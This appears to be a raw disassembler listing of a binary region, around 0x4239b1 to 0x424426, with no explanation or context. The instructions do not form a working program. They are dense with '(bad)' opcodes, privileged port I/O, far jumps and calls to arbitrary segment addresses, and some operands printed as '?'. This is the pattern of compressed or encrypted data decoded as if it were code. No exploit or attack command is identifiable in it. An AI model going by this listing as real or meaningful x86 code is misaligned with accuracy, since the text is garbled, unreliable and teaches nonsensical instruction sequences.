  4239b1:	sbb    DWORD PTR [ebx-0x56626e06],edx
  4239b7:	sbb    DWORD PTR [edx],0xffffffaf
  4239ba:	mov    ah,0xed
  4239bc:	jg     0x423992
  4239be:	jmp    0x3fca:0xad69d582
  4239c5:	mov    eax,ds:0xcb2a7a02
  4239ca:	shl    BYTE PTR [edx+0x4],1
  4239cd:	outs   dx,DWORD PTR ds:[esi]
  4239ce:	inc    edx
  4239cf:	and    esp,esp
  4239d1:	jg     0x423a32
  4239d3:	add    al,0x9e
  4239d5:	ror    BYTE PTR [esi+0x6b6cd6c8],cl
  4239db:	add    eax,0xca78065
  4239e0:	or     si,WORD PTR [edx]
  4239e3:	mov    BYTE PTR [edi+0x3d],ch
  4239e6:	mov    ecx,DWORD PTR [eax-0x5b]
  4239e9:	out    dx,al
  4239ea:	out    0x55,eax
  4239ec:	mov    bh,0x6
  4239ee:	cmp    edx,edx
  4239f0:	pop    esp
  4239f1:	sbb    cl,BYTE PTR [edi]
  4239f3:	sbb    BYTE PTR [ebx-0x5fec2abc],0x86
  4239fa:	dec    edx
  4239fb:	int    0xce
  4239fd:	ss ret 0xe597
  423a01:	adc    ch,BYTE PTR [edx]
  423a03:	adc    ecx,DWORD PTR [ecx-0x47]
  423a06:	dec    esi
  423a07:	aaa    
  423a08:	scas   eax,DWORD PTR es:[edi]
  423a09:	xchg   BYTE PTR ds:0x53a71db,dl
  423a0f:	popa   
  423a10:	xchg   ebx,eax
  423a11:	jns    0x4239f3
  423a13:	inc    ebx
  423a14:	adc    ecx,ebp
  423a16:	loope  0x423a00
  423a18:	enter  0x7f26,0xb2
  423a1c:	cmc    
  423a1d:	mov    ds:0xe40f3f03,al
  423a22:	sub    ebp,DWORD PTR [ebx]
  423a24:	loopne 0x423a4e
  423a26:	stos   DWORD PTR es:[edi],eax
  423a27:	mov    dl,0x10
  423a29:	sbb    bh,BYTE PTR [eax+0x73]
  423a2c:	jmp    0x6597:0x2d4cf282
  423a33:	mov    ebx,0x7a4f0e41
  423a38:	call   0x7816:0x72a7b2bb
  423a3f:	iret   
  423a40:	mov    dh,0x1d
  423a42:	add    DWORD PTR [edx-0x15],ebp
  423a45:	mov    ds:0x6fd4bf0c,eax
  423a4a:	and    esi,edx
  423a4c:	clc    
  423a4d:	popa   
  423a4e:	sub    DWORD PTR [edi+0x48bb7c8c],eax
  423a54:	(bad)  
  423a55:	jns    0x423a90
  423a57:	cmp    bl,ch
  423a59:	jae    0x423a06
  423a5b:	fwait
  423a5c:	popa   
  423a5d:	nop
  423a5e:	push   edx
  423a5f:	iret   
  423a60:	push   esi
  423a61:	xchg   ebx,eax
  423a62:	arpl   WORD PTR [esi-0x2b],dx
  423a65:	rcr    BYTE PTR ds:0xc5e00d53,1
  423a6b:	mov    ebp,0x1b8b35ab
  423a70:	or     BYTE PTR [esi-0xa5032f],bl
  423a76:	shr    DWORD PTR [edx-0x304d7270],cl
  423a7c:	sbb    BYTE PTR [edx-0x26],ah
  423a7f:	mov    dh,0x5f
  423a81:	pushf  
  423a82:	inc    edx
  423a83:	fisttp QWORD PTR [ecx+edx*4+0x1e8a7ae]
  423a8a:	jg     0x423a73
  423a8c:	mov    edi,0x6ef437f2
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	ds out dx,eax
  423b02:	mov    al,ds:0x17d2456
  423b07:	add    BYTE PTR ds:0xa7000001,al
  423b0d:	fimul  WORD PTR [esi]
  423b0f:	sahf   
  423b10:	ss je  0x423b52
  423b13:	mov    ah,0x34
  423b15:	test   al,0xc1
  423b17:	test   BYTE PTR [eax+edi*1-0x7c],dl
  423b1b:	jns    0x423b92
  423b1d:	fdivr  st,st(7)
  423b1f:	iret   
  423b20:	ficom  WORD PTR [esi+0x64c4696b]
  423b26:	mov    ds:0x5083a40b,al
  423b2b:	es mov edx,0xf20f4906
  423b31:	dec    ecx
  423b32:	leave  
  423b33:	je     0x423b77
  423b35:	(bad)  
  423b36:	jmp    FWORD PTR [ecx-0x7d3ed676]
  423b3c:	jge    0x423b0d
  423b3e:	scas   al,BYTE PTR es:[edi]
  423b3f:	fld    DWORD PTR [esi]
  423b41:	xor    edi,0xfdbd4fb2
  423b47:	test   DWORD PTR ds:0x2ca196c2,eax
  423b4d:	rol    DWORD PTR [esi+ebp*8],1
  423b50:	mov    esp,0x95a18dbb
  423b55:	sub    eax,0x843b437d
  423b5a:	sub    esp,ecx
  423b5c:	and    eax,DWORD PTR [ecx-0x59]
  423b5f:	jle    0x423bab
  423b61:	mov    dh,0xd4
  423b63:	push   ebp
  423b64:	dec    esi
  423b65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b66:	mov    ds:0x51e58fa3,eax
  423b6b:	adc    eax,0xe8f17b43
  423b70:	xchg   edi,eax
  423b71:	dec    eax
  423b72:	jl     0x423b15
  423b74:	pop    esp
  423b75:	cmp    al,0x3a
  423b77:	add    ebx,DWORD PTR [esi]
  423b79:	mov    esi,0xa6eaab9e
  423b7e:	outs   dx,BYTE PTR ds:[esi]
  423b7f:	mov    al,0xdc
  423b81:	push   cs
  423b82:	dec    edx
  423b83:	popf   
  423b84:	scas   eax,DWORD PTR es:[edi]
  423b85:	iret   
  423b86:	shl    BYTE PTR [eax+ebx*4+0x26],cl
  423b8a:	push   ds
  423b8b:	xor    DWORD PTR [edi],ebx
  423b8d:	fstp   QWORD PTR [ebx-0x686bccaf]
  423b93:	pop    esi
  423b94:	inc    ebp
  423b95:	push   ds
  423b96:	ds or  cl,0xe0
  423b9a:	scas   eax,DWORD PTR es:[edi]
  423b9b:	nop    DWORD PTR [ecx]
  423b9e:	jge    0x423b59
  423ba0:	xchg   edx,eax
  423ba1:	fnstenv ds:0x521fd8fc
  423ba7:	sti    
  423ba8:	addr16 and ch,bl
  423bab:	or     DWORD PTR [ecx-0x22],0xeedf716f
  423bb2:	loopne 0x423bc6
  423bb4:	fwait
  423bb5:	shl    DWORD PTR ds:0xe484a5b4,cl
  423bbb:	stos   DWORD PTR es:[edi],eax
  423bbc:	mov    ecx,0x18d2b038
  423bc1:	push   edx
  423bc2:	mov    DWORD PTR [ebx-0x6d604d55],esi
  423bc8:	in     eax,0x2c
  423bca:	push   ecx
  423bcb:	adc    ch,BYTE PTR [ebp+0x723677b3]
  423bd1:	test   DWORD PTR [edi+ebp*1+0x25],ebp
  423bd5:	mov    gs,WORD PTR [eax+0x461f193a]
  423bdb:	sbb    BYTE PTR [edi+0x23],0xff
  423bdf:	add    BYTE PTR [ebx+ebx*8+0x79],0x47
  423be4:	jp     0x423bdd
  423be6:	aam    0x61
  423be8:	sbb    al,0xa0
  423bea:	outs   dx,BYTE PTR ds:[esi]
  423beb:	inc    edi
  423bec:	jbe    0x423c12
  423bee:	dec    edx
  423bef:	xchg   DWORD PTR [ebp+0x65],eax
  423bf2:	push   0x17
  423bf4:	push   es
  423bf5:	mov    esi,0x76fd7cdc
  423bfa:	scas   eax,DWORD PTR es:[edi]
  423bfb:	je     0x423bea
  423bfd:	hlt    
  423bfe:	dec    ebx
  423bff:	retf   
  423c00:	push   0xb50d6a74
  423c05:	mov    ?,WORD PTR [esi+0x6]
  423c08:	cmp    BYTE PTR ds:0xce7082eb,al
  423c0e:	mov    al,0xc0
  423c10:	int    0x0
	...
  423c72:	add    BYTE PTR [eax],al
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x9446617]
  423c81:	or     DWORD PTR ds:0x17e298a,0x0
  423c88:	add    eax,0xfe000001
  423c8d:	add    BYTE PTR [edx],bh
  423c8f:	push   ecx
  423c90:	in     eax,dx
  423c91:	aaa    
  423c92:	mov    ?,edx
  423c94:	les    ecx,FWORD PTR [ecx+0x44966d4]
  423c9a:	or     bh,dh
  423c9c:	ror    BYTE PTR [esi-0x31],1
  423c9f:	xchg   BYTE PTR [esi],bh
  423ca1:	jmp    0xf6495a03
  423ca6:	add    esp,edi
  423ca8:	outs   dx,DWORD PTR ds:[esi]
  423ca9:	cmc    
  423caa:	xor    DWORD PTR [edx-0x7c116c4e],edi
  423cb0:	and    bl,BYTE PTR [eax+ebx*8]
  423cb3:	mov    esp,0x8c45c5d5
  423cb8:	mov    ecx,0x7a5fa35a
  423cbd:	sub    eax,0x7567ee3f
  423cc2:	fimul  DWORD PTR [edx-0x32]
  423cc5:	cmc    
  423cc6:	mov    dl,0xe8
  423cc8:	add    dh,al
  423cca:	mov    ah,0x98
  423ccc:	push   edi
  423ccd:	cmp    al,0x55
  423ccf:	inc    esp
  423cd0:	or     BYTE PTR [edx],bh
  423cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cd3:	mov    BYTE PTR [eax+0x3b],0xdb
  423cd7:	lods   eax,DWORD PTR ds:[esi]
  423cd8:	sbb    edi,edi
  423cda:	nop
  423cdb:	js     0x423d2d
  423cdd:	sbb    DWORD PTR [ecx-0x2713dc37],edx
  423ce3:	cwde   
  423ce4:	mov    dl,0xd4
  423ce6:	mov    cl,0xfd
  423ce8:	jmp    0x423ca1
  423cea:	xor    al,BYTE PTR [ebx+0x6724e9a6]
  423cf0:	add    eax,0xbff33a5
  423cf5:	stos   DWORD PTR es:[edi],eax
  423cf6:	push   edx
  423cf7:	add    DWORD PTR [edi+0x60c3a85b],edi
  423cfd:	stc    
  423cfe:	dec    ebp
  423cff:	popa   
  423d00:	xchg   esi,eax
  423d01:	(bad)  
  423d02:	jecxz  0x423ceb
  423d04:	xchg   esi,eax
  423d05:	scas   eax,DWORD PTR es:[edi]
  423d06:	fcomi  st,st(5)
  423d08:	shl    BYTE PTR [ebx+0x6],0xa6
  423d0c:	mov    al,0xfa
  423d0e:	icebp  
  423d0f:	add    eax,0x5904be65
  423d14:	shr    ah,0x3f
  423d17:	push   esp
  423d18:	mov    DWORD PTR [ecx-0x43266c1d],eax
  423d1e:	(bad)  
  423d1f:	mov    BYTE PTR [esi],ch
  423d21:	mov    esp,ebx
  423d23:	push   esi
  423d24:	and    BYTE PTR [eax-0x3f],bh
  423d27:	iret   
  423d28:	mov    al,ds:0xb7954117
  423d2d:	sub    edx,DWORD PTR [edi]
  423d2f:	test   al,0xf5
  423d31:	aad    0x6f
  423d33:	pusha  
  423d34:	test   BYTE PTR [edx-0x28b15b5e],cl
  423d3a:	inc    esp
  423d3b:	xchg   ebp,eax
  423d3c:	pop    edi
  423d3d:	push   ecx
  423d3e:	inc    esi
  423d3f:	ins    DWORD PTR es:[edi],dx
  423d40:	mov    bh,0xb2
  423d42:	inc    ebp
  423d43:	ret    
  423d44:	mov    ds:0xbc38d3d5,al
  423d49:	mov    esp,0xb0291650
  423d4e:	into   
  423d4f:	sub    DWORD PTR [ecx],0x4e
  423d52:	jno    0x423d06
  423d54:	ds or  al,0x77
  423d57:	xchg   edi,eax
  423d58:	std    
  423d59:	cli    
  423d5a:	shr    BYTE PTR fs:[edi+ebx*8+0x4207e42c],cl
  423d62:	pop    ds
  423d63:	cmp    dl,BYTE PTR [ebx+ebx*4]
  423d66:	sti    
  423d67:	sbb    eax,0xe44b59e8
  423d6c:	ins    BYTE PTR es:[edi],dx
  423d6d:	aam    0xd4
  423d6f:	xchg   ecx,eax
  423d70:	out    0xc0,al
  423d72:	mov    DWORD PTR [edi+0x4254bd3f],esp
  423d78:	out    dx,al
  423d79:	mov    WORD PTR [edx+0xe],ds
  423d7c:	sub    ch,BYTE PTR [edx]
  423d7e:	shr    DWORD PTR [edi+0x3d],cl
  423d81:	xchg   ebx,eax
  423d82:	jmp    0xf4f2f85c
  423d87:	ins    BYTE PTR es:[edi],dx
  423d88:	cwde   
  423d89:	adc    bh,0x84
  423d8c:	jb     0x423d88
  423d8e:	mov    eax,ds:0x6266
	...
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x68fad3d2],esp
  423e03:	xor    al,0x2e
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0x66000001,al
  423e0d:	mov    bh,0x62
  423e0f:	push   esi
  423e10:	add    ebp,DWORD PTR [ecx-0x36bb3021]
  423e16:	mov    esi,0xf920b136
  423e1b:	out    dx,eax
  423e1c:	aas    
  423e1d:	jmp    0x96481a24
  423e22:	xchg   edi,eax
  423e23:	jno    0x423e5c
  423e25:	jl     0x423de6
  423e27:	and    esi,DWORD PTR [eax]
  423e29:	dec    edi
  423e2a:	fnstsw WORD PTR [esp+esi*2-0x80]
  423e2e:	sbb    BYTE PTR [eax-0x55df1195],bh
  423e34:	aaa    
  423e35:	push   ebx
  423e36:	or     al,0x90
  423e38:	(bad)  
  423e39:	cmp    edx,DWORD PTR [esi+ecx*1-0x227c9d50]
  423e40:	mov    ebx,esp
  423e42:	push   ecx
  423e43:	out    dx,eax
  423e44:	cmp    DWORD PTR [ecx-0x62],edi
  423e47:	mov    cl,0xd0
  423e49:	mov    ebp,0xd0f335ad
  423e4e:	jecxz  0x423ea0
  423e50:	mov    bl,0xc8
  423e52:	test   al,0x72
  423e54:	popf   
  423e55:	imul   esi,ecx,0x12221c6e
  423e5b:	(bad)  
  423e5c:	sub    al,al
  423e5e:	push   0x52bb788d
  423e63:	lods   al,BYTE PTR ds:[esi]
  423e64:	xchg   edx,eax
  423e65:	inc    ebp
  423e66:	call   0x8b1807ca
  423e6b:	jp     0x423e15
  423e6d:	add    al,0x5a
  423e6f:	data16 rcl bl,1
  423e72:	(bad)  
  423e73:	lods   al,BYTE PTR ds:[esi]
  423e74:	sbb    bl,0xb6
  423e77:	dec    edx
  423e78:	sub    BYTE PTR [eax+0xfc313d0],cl
  423e7e:	push   ecx
  423e7f:	imul   edi,DWORD PTR [eax+0x22],0xffffffa1
  423e83:	hlt    
  423e84:	pop    es
  423e85:	jnp    0x423efe
  423e87:	sbb    DWORD PTR [eax],esp
  423e89:	jmp    0x423e47
  423e8b:	(bad)  
  423e8c:	xchg   ebp,eax
  423e8d:	and    dl,bh
  423e8f:	imul   esi,DWORD PTR [ecx+0x10],0xf42e12c8
  423e96:	mov    bl,0x9b
  423e98:	mov    ebp,0x1c9e1bd7
  423e9d:	fsubr  st,st(6)
  423e9f:	fwait
  423ea0:	into   
  423ea1:	mov    eax,ds:0xed9f887c
  423ea6:	xor    DWORD PTR [ecx+edx*4],ecx
  423ea9:	or     ecx,DWORD PTR [edx]
  423eab:	mov    esi,0x539e0c20
  423eb0:	xchg   edx,eax
  423eb1:	xchg   ebp,eax
  423eb2:	add    bh,BYTE PTR [edx+esi*4-0x5f]
  423eb6:	loopne 0x423ef0
  423eb8:	int3   
  423eb9:	or     ch,BYTE PTR [ebx+0x93413b4]
  423ebf:	(bad)  
  423ec1:	dec    eax
  423ec2:	mov    esp,ebp
  423ec4:	pusha  
  423ec5:	sub    dl,0x1f
  423ec8:	adc    bh,ch
  423eca:	dec    edi
  423ecb:	(bad)  
  423ecc:	xchg   ebx,eax
  423ecd:	xor    dl,ch
  423ecf:	bound  ebx,QWORD PTR [edi-0x32]
  423ed2:	aam    0xdf
  423ed4:	fnstenv [edx-0x2f]
  423ed7:	popf   
  423ed8:	lods   al,BYTE PTR ds:[esi]
  423ed9:	aas    
  423eda:	xor    edx,DWORD PTR [bx+di-0x59]
  423ede:	mov    ebp,0xf1c81793
  423ee3:	stos   DWORD PTR es:[edi],eax
  423ee4:	cmp    ebp,edx
  423ee6:	cld    
  423ee7:	and    al,0xd0
  423ee9:	nop
  423eea:	adc    al,BYTE PTR [ebx-0x36]
  423eed:	sub    esi,DWORD PTR [ebx]
  423eef:	dec    esi
  423ef0:	xchg   DWORD PTR [ecx-0x3f],edx
  423ef3:	sbb    BYTE PTR [eax],0x74
  423ef6:	or     BYTE PTR [ebx+0x11272b3e],dh
  423efc:	jno    0x423f17
  423efe:	mov    cl,0xc1
  423f00:	(bad)  
  423f01:	clc    
  423f02:	mov    DWORD PTR [edi-0xc6402e],ecx
  423f08:	or     al,ah
  423f0a:	or     BYTE PTR [edx+esi*1-0x38],al
  423f0e:	icebp  
  423f0f:	idiv   DWORD PTR [ebx+0x0]
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	imul   BYTE PTR ds:0x80333f66
  423f86:	add    DWORD PTR [eax],eax
  423f88:	add    eax,0x4e000001
  423f8d:	bnd jo 0x423f28
  423f90:	sti    
  423f91:	pushf  
  423f92:	mov    eax,0x991e638f
  423f97:	ret    0xbd40
  423f9a:	mov    dl,0xb6
  423f9c:	adc    dl,BYTE PTR [ebp-0x1f3117c3]
  423fa2:	or     BYTE PTR [edi],cl
  423fa4:	adc    ecx,DWORD PTR [edx-0x3c5be8e8]
  423faa:	sub    eax,0x484fd7fb
  423faf:	scas   al,BYTE PTR es:[edi]
  423fb0:	enter  0x8a8a,0x98
  423fb4:	ins    BYTE PTR es:[edi],dx
  423fb5:	sub    cl,BYTE PTR [ebx+0x1ae13652]
  423fbb:	pop    ebp
  423fbc:	xchg   edx,eax
  423fbd:	rol    al,0x28
  423fc0:	dec    ebp
  423fc1:	mov    al,cl
  423fc3:	add    eax,0xa45b9aa1
  423fc8:	dec    esp
  423fc9:	imul   ebx,DWORD PTR [ebx+0x6f],0xe3c67c25
  423fd0:	and    ebx,DWORD PTR [edx-0x697c8b25]
  423fd6:	stos   DWORD PTR es:[edi],eax
  423fd7:	not    eax
  423fd9:	pop    edx
  423fda:	das    
  423fdb:	in     al,dx
  423fdc:	fcom   DWORD PTR [ecx+0x5f]
  423fdf:	push   ebx
  423fe0:	inc    esi
  423fe1:	(bad)  
  423fe3:	imul   eax,edi,0x971a034
  423fe9:	cmp    al,0x5a
  423feb:	popf   
  423fec:	inc    edi
  423fed:	dec    eax
  423fee:	ins    DWORD PTR es:[edi],dx
  423fef:	ins    DWORD PTR es:[edi],dx
  423ff0:	xchg   esp,esp
  423ff2:	add    eax,0x8457b405
  423ff7:	jne    0x423f97
  423ff9:	push   edi
  423ffa:	mov    DWORD PTR [ebx],0x7f1f1719
  424000:	mov    ch,0x44
  424002:	shl    al,cl
  424004:	sub    BYTE PTR [esi-0x5042a112],ch
  42400a:	(bad)  
  42400c:	adc    esp,edi
  42400e:	cmp    DWORD PTR [edi],edx
  424010:	test   BYTE PTR [esi-0x47],ah
  424013:	clc    
  424014:	xor    al,0x69
  424016:	into   
  424017:	popa   
  424018:	jl     0x424094
  42401a:	stos   BYTE PTR es:[edi],al
  42401b:	loop   0x42405b
  42401d:	mov    esi,0xdf3c762
  424022:	xor    ebp,edx
  424024:	mov    eax,0xa99e23df
  424029:	mov    ah,0xc
  42402b:	xor    DWORD PTR ds:[edx+0x40dcaecd],edx
  424032:	arpl   WORD PTR [esi-0x7d],bp
  424035:	shr    DWORD PTR [edx-0x75],1
  424038:	dec    esp
  424039:	or     al,0xab
  42403b:	stos   BYTE PTR es:[edi],al
  42403c:	scas   al,BYTE PTR es:[edi]
  42403d:	mov    ebx,0xa26190af
  424042:	into   
  424043:	popa   
  424044:	cmp    bh,BYTE PTR [edx+0x2a]
  424047:	inc    esp
  424048:	fsubrp st(7),st
  42404a:	idiv   BYTE PTR ss:[ebp-0x20]
  42404e:	dec    ecx
  42404f:	lds    edi,FWORD PTR [edx-0x14e59a1f]
  424055:	pop    ebp
  424056:	(bad)  
  424057:	out    0x57,al
  424059:	ret    0xdf9d
  42405c:	or     dl,BYTE PTR [ebp+0x6e]
  42405f:	rol    BYTE PTR [eax-0x6a9dd3f2],1
  424065:	dec    si
  424067:	mov    edx,0x3bfe509e
  42406c:	(bad)  
  42406d:	cmp    DWORD PTR [eax],ecx
  42406f:	into   
  424070:	int    0x72
  424072:	push   ds
  424073:	jp     0x424098
  424075:	js     0x4240be
  424077:	repnz add DWORD PTR [ebp-0x3864eef1],eax
  42407e:	add    BYTE PTR [eax],dl
  424080:	bndldx bnd2,[ebp+ebx*1+0x38e60057]
  424088:	dec    ebp
  424089:	jb     0x424060
  42408b:	jns    0x424073
  42408d:	mov    edi,DWORD PTR [edi-0x1e]
  424090:	out    0x0,eax
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	out    0x2a,eax
  424102:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424103:	mov    dl,0x38
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    BYTE PTR [eax+ebp*8],al
  42410e:	int3   
  42410f:	int3   
  424110:	lds    ecx,FWORD PTR [edi]
  424112:	jne    0x4240d7
  424114:	mov    dh,0xaa
  424116:	icebp  
  424117:	add    al,BYTE PTR [esi-0x49b53bd]
  42411d:	fdiv   DWORD PTR [esi+eiz*8+0x0]
  424121:	xor    bl,BYTE PTR [ebp-0x2de7e33b]
  424127:	push   eax
  424128:	pop    edx
  42412a:	or     DWORD PTR [eax],ecx
  42412c:	or     dh,BYTE PTR [esi]
  42412e:	dec    edi
  42412f:	int    0x32
  424131:	ret    0xedf8
  424134:	pop    esp
  424135:	mov    esi,0x9378d6ad
  42413a:	mov    ds:0x9787df92,al
  42413f:	aaa    
  424140:	push   ebx
  424141:	ja     0x42412f
  424143:	fldenv [ebx]
  424145:	jle    0x4241a1
  424147:	pop    edi
  424148:	stc    
  424149:	inc    ecx
  42414a:	xchg   esi,eax
  42414b:	adc    BYTE PTR [edx+ebp*2+0x41],ch
  42414f:	in     al,dx
  424150:	inc    eax
  424151:	out    dx,eax
  424152:	jge    0x4240e0
  424154:	repnz mov DWORD PTR [ecx-0x50],edx
  424158:	adc    BYTE PTR ds:0x3af1394b,ch
  42415e:	cmp    eax,DWORD PTR [ebx]
  424160:	fnstsw WORD PTR [edi-0x35]
  424163:	shl    BYTE PTR [edx+0x44],0xf5
  424167:	in     al,dx
  424168:	inc    ebp
  424169:	pop    ss
  42416a:	cs retf 0x4515
  42416e:	xchg   DWORD PTR [edx-0x35fe2df8],esi
  424174:	sbb    eax,0xd73442c0
  424179:	rol    BYTE PTR [eax-0x504c4316],0x3
  424180:	jmp    FWORD PTR [edi]
  424182:	outs   dx,BYTE PTR ds:[esi]
  424183:	xor    ecx,DWORD PTR [ebx+0x163a4a8d]
  424189:	mov    edx,0xec565e33
  42418e:	add    eax,0x12de2ec9
  424193:	jne    0x4241ba
  424195:	mov    al,ds:0x84d413eb
  42419a:	or     BYTE PTR [edx+0x12],cl
  42419d:	cmc    
  42419e:	pop    edi
  42419f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241a0:	and    BYTE PTR [esi],0xc2
  4241a3:	sbb    BYTE PTR [ebx+0x4a],dh
  4241a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241a7:	fisubr DWORD PTR [ecx+0x54ea7c49]
  4241ad:	mov    ebx,0x48a8ae59
  4241b2:	outs   dx,BYTE PTR ds:[esi]
  4241b3:	cmp    DWORD PTR [esi+edx*8-0x55],edi
  4241b7:	and    eax,0x59cb5108
  4241bc:	(bad)  
  4241bd:	in     al,0xb7
  4241bf:	and    BYTE PTR [ebx+edx*4-0x11a084c9],bh
  4241c6:	cmp    BYTE PTR [ebp-0x2aa15a3b],ch
  4241cc:	and    bh,bl
  4241ce:	xchg   DWORD PTR [edi],esp
  4241d0:	sub    eax,0x6cb01ca8
  4241d5:	adc    BYTE PTR [ecx],0xea
  4241d8:	cld    
  4241d9:	pusha  
  4241da:	je     0x4241f1
  4241dc:	sub    edi,ebx
  4241de:	push   es
  4241df:	or     ecx,DWORD PTR [eax-0x73663007]
  4241e5:	xchg   ebp,eax
  4241e6:	fcomp  DWORD PTR [eax+0xc]
  4241e9:	pop    esp
  4241ea:	adc    bh,BYTE PTR [ecx]
  4241ec:	test   eax,0xd7d2897f
  4241f1:	clc    
  4241f2:	push   ebx
  4241f3:	xor    al,BYTE PTR [edi+0x3d]
  4241f6:	mov    ch,0x9c
  4241f8:	dec    edi
  4241f9:	call   0x8eed:0x2318bd75
  424200:	mov    edi,0x61c09dbf
  424206:	push   esi
  424207:	mov    eax,ds:0x616ab1f7
  42420c:	sub    BYTE PTR [ebx-0x3a],bl
  42420f:	dec    edx
  424210:	dec    ebp
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	scas   eax,DWORD PTR es:[edi]
  424281:	jno    0x42428e
  424283:	dec    ecx
  424284:	cmp    eax,0x5000182
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    cl,bh
  42428d:	stos   DWORD PTR es:[edi],eax
  42428e:	dec    esp
  42428f:	push   es
  424290:	pop    ecx
  424291:	ss push ecx
  424293:	jecxz  0x4242e2
  424295:	cmc    
  424296:	push   ecx
  424297:	xlat   BYTE PTR ds:[ebx]
  424298:	sub    eax,0x748d27b9
  42429d:	inc    BYTE PTR [esi+0x44d20fe]
  4242a3:	adc    DWORD PTR [ebx+edx*1+0x36702baf],eax
  4242aa:	jnp    0x424246
  4242ac:	das    
  4242ad:	push   eax
  4242ae:	xor    bh,BYTE PTR ds:[edx-0x79f77ada]
  4242b5:	add    eax,DWORD PTR [eax]
  4242b7:	push   ebp
  4242b8:	cli    
  4242b9:	add    edx,DWORD PTR [esp+esi*4-0x28]
  4242bd:	fwait
  4242be:	add    DWORD PTR [edi],0x2b348d03
  4242c4:	retf   
  4242c5:	jg     0x4242d5
  4242c7:	repnz mov ch,0xe7
  4242ca:	aam    0xf2
  4242cc:	shr    DWORD PTR [edi+0x304bb3c8],0xab
  4242d3:	push   edi
  4242d4:	and    DWORD PTR [ecx-0x28],ebp
  4242d7:	pop    esi
  4242d8:	push   cs
  4242d9:	fwait
  4242da:	push   esi
  4242db:	sbb    DWORD PTR [edi+0x1e],0x3d
  4242df:	mov    cl,0xa7
  4242e1:	bound  edi,QWORD PTR [eax+0x40]
  4242e4:	(bad)  
  4242e5:	pop    es
  4242e6:	jno    0x424365
  4242e8:	adc    eax,0x528c5bb9
  4242ed:	aad    0xb7
  4242ef:	mov    edx,0xa5b9ee13
  4242f4:	and    al,0xa1
  4242f6:	xchg   ecx,eax
  4242f7:	mov    WORD PTR [esi+0x38],?
  4242fa:	xchg   ebp,eax
  4242fb:	enter  0x6e10,0x11
  4242ff:	mov    esp,0xcbd06e4a
  424304:	mov    ds:0x899e1d73,eax
  424309:	das    
  42430a:	dec    eax
  42430b:	fild   QWORD PTR ds:0xe84f3950
  424311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424312:	and    BYTE PTR [esi],ah
  424314:	(bad)  
  424315:	jnp    0x4242ee
  424317:	sbb    DWORD PTR [edx-0x40d3e1c2],esi
  42431d:	dec    ebx
  42431e:	push   esp
  42431f:	xor    al,0xbf
  424321:	fcomp  DWORD PTR [ecx+0x1c055db7]
  424327:	pop    eax
  424328:	adc    eax,0xf3155a05
  42432d:	sub    DWORD PTR [edx+esi*8+0x9],ecx
  424331:	dec    ecx
  424332:	into   
  424333:	ror    DWORD PTR [edi-0x6d],0x81
  424337:	xchg   ebp,eax
  424338:	mov    edi,0xb0c9df04
  42433d:	and    dl,dl
  42433f:	stos   BYTE PTR es:[edi],al
  424340:	push   DWORD PTR [esi+eiz*1]
  424343:	in     eax,dx
  424344:	fwait
  424345:	sub    bh,BYTE PTR [eax]
  424347:	js     0x424349
  424349:	jne    0x42437f
  42434b:	adc    BYTE PTR [ebx],cl
  42434d:	jne    0x42436c
  42434f:	in     eax,0xac
  424351:	cld    
  424352:	pushf  
  424353:	arpl   WORD PTR [edi+0xe],cx
  424356:	retf   0xfed1
  424359:	imul   edi,DWORD PTR [esi-0x99787fa],0xffffffbf
  424360:	and    al,0xce
  424362:	cmp    DWORD PTR [eax],0x11
  424365:	lds    esi,FWORD PTR [esi]
  424367:	sbb    eax,0x416e9b23
  42436c:	in     al,dx
  42436d:	cli    
  42436e:	add    al,0xe3
  424370:	sub    cl,BYTE PTR [ecx-0x452c7d4f]
  424376:	mov    dl,0xa6
  424378:	or     DWORD PTR [ebx],0x50755b9b
  42437e:	xchg   edi,eax
  42437f:	mov    al,ds:0x586fbb41
  424384:	xor    edi,DWORD PTR [ebx-0x50e1a21]
  42438a:	dec    eax
  42438b:	or     BYTE PTR [esi-0x10c7d41],0x0
	...
  4243f2:	add    BYTE PTR [eax],al
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42442c
  424401:	mov    bh,0x5f
  424403:	mov    es,WORD PTR [edx-0x7d]
  424406:	add    DWORD PTR [eax],eax
  424408:	add    eax,0x70000001
  42440d:	popf   
  42440e:	daa    
  42440f:	mov    edi,0x33a09773
  424414:	aad    0x14
  424416:	xchg   ecx,eax
  424417:	or     dl,BYTE PTR [esi+eax*4]
  42441a:	inc    edi
  42441b:	outs   dx,BYTE PTR ds:[esi]
  42441c:	push   eax
  42441d:	xchg   BYTE PTR [edx-0x5e],bl
  424420:	rcr    DWORD PTR [ebp+0x10],cl
  424423:	ja     0x42446d
  424425:	ins    BYTE PTR es:[edi],dx
  424426:	inc    esp
